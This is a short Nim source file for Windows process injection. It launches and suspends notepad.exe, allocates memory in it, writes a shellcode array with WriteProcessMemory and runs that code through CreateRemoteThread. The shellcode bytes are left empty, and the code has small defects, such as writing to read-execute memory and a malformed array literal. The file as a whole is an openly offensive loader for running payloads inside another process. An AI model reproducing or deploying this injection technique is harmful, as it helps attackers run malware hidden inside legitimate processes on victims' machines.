import winim/lean
import osproc

var shellcode: array[296, byte] = [
byte ]

# Our main procedure
proc injector[I, T](shellcode: array[I, T]): void =

    echo "[*] Let's go to work!"

# TODO: 

    # Start and suspend a process
    let injProc = startProcess("notepad.exe")
    injProc.suspend()
    echo "[*} Process started and suspended: ", injProc.processID
    # Open the process so we can access it with a handle
    let hinjProc = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](injProc.processID))
    echo "[*] Our injected process handle: ", hinjProc
    # Call VirtualAllocEx to make some memory space
    let pmem = VirtualAllocEx(hinjProc, NULL,cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ)
    # Call WriteProcessMemory to write shellcode into the memory
    var bytesw: SIZE_T
    let success = WriteProcessMemory(hinjProc, pmem,unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesw)
    echo "[*] WriteProcessMemory: ", cast[bool](success)
    echo "    \\-- bytes written: ", bytesw
    echo ""
    # Call CreateRemoteThread to execute a thread with the shellcode stuffed in it
    let hthread = CreateRemoteThread(hinjProc, NULL, 0, cast[LPTHREAD_START_ROUTINE](pmem), NULL, 0, NULL)
    # POG when it works    
    echo "[*] Thread Handler ",hthread
    echo "[*] It works!" 



# Kick off the main module
when isMainModule:
    injector(shellcode)